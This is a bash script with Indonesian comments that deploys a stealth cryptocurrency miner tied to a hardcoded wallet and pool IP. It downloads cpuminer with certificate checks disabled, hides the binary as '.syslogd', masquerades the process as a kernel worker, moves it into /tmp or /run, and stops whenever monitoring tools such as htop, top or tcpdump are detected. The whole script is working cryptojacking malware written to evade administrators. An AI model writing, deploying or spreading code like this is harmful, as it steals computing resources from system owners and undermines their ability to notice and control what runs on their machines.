#!/bin/bash
set -e

# ====[ Konfigurasi User ]====
WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9.Danis"
POOL="stratum+tcps://159.223.48.143:443"
ALGO="power2b"
THREADS=$(nproc --all)
BIN_NAME=".syslogd"
PROCESS_NAME="[kworker/u8:3-events]"
LOG_FILE=".xlog"
DELAY_MIN=5
DELAY_MAX=15
KILL_LIST=("htop" "top" "lsof" "tcpdump" "nethogs")

# ====[ Install Dependensi ]====
apt update -y && apt install -y wget tar curl

# ====[ Cek IP Publik ]====
MYIP=$(curl -s https://api.ipify.org)
if echo "$MYIP" | grep -qE '159\.223\.48\.143'; then
    echo "[X] IP publik kamu sama dengan IP pool. Risiko banned tinggi."
    exit 1
fi

# ====[ Download Miner ]====
if [ ! -f "$BIN_NAME" ]; then
    echo "[INFO] Mengunduh miner..."
    wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$BIN_NAME"
    chmod +x "$BIN_NAME"
    rm -f cpuminer-opt-linux.tar.gz
fi

# ====[ Fungsi Delay Random ]====
random_delay() {
    DELAY=$(( RANDOM % (DELAY_MAX - DELAY_MIN + 1) + DELAY_MIN ))
    echo "[INFO] Delay acak selama $DELAY detik..."
    sleep $DELAY
}

# ====[ Deteksi Proses Monitoring dan Auto Kill ]====
detect_and_kill() {
    for proc in "${KILL_LIST[@]}"; do
        if pgrep -x "$proc" > /dev/null; then
            echo "[ALERT] Deteksi proses '$proc'. Menghentikan script..." >> "$LOG_FILE"
            exit 0
        fi
    done
}

# ====[ Loop Mining Stealth ]====
echo "[INFO] Menjalankan mining stealth dengan evasive mode..."

while true; do
    detect_and_kill
    echo "[INFO] $(date) :: Menjalankan miner stealth..." >> "$LOG_FILE"

    WORKDIR=$(shuf -n 1 -e /tmp /run)
    cp "$BIN_NAME" "$WORKDIR/$BIN_NAME.$$"
    chmod +x "$WORKDIR/$BIN_NAME.$$"
    rm -f "$BIN_NAME"

    exec -a "$PROCESS_NAME" "$WORKDIR/$BIN_NAME.$$" -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS >> "$LOG_FILE" 2>&1 || true

    echo "[WARN] Miner keluar. Reinit ulang..." >> "$LOG_FILE"
    random_delay
done
